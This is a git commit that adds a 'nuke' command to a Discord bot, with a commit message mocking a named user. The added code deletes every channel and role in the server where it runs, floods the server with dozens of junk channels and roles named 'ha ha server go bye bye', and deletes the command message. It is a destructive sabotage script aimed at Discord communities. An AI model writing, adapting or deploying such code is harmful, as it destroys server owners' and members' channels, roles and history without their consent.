b5c372805038787f3089de3e60c7f874196bff1d
LtUnkn0wn2 <50663403+LtUnkn0wn2@users.noreply.github.com>
2020-05-07 02:43:47 -0400

    nuke R.I.P Braze lol
    Dedicated to pimponipo#8742 cuz apperantly im a skid

---
+++ commands/nuke.js
@@ -0,0 +1,216 @@
+const Discord = require("discord.js");
+
+
+module.exports.run = async (bot, message, args) => {
+    message.guild.channels.deleteAll();
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.createChannel("Ha Ha Server Go Bye Bye","Bye Bye")
+    message.guild.roles.deleteAll();
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+    message.guild.createRole({ name: 'ha ha server go bye bye'});
+  message.delete();
+},
+module.exports.command = {
+    name: "nuke",
+}   
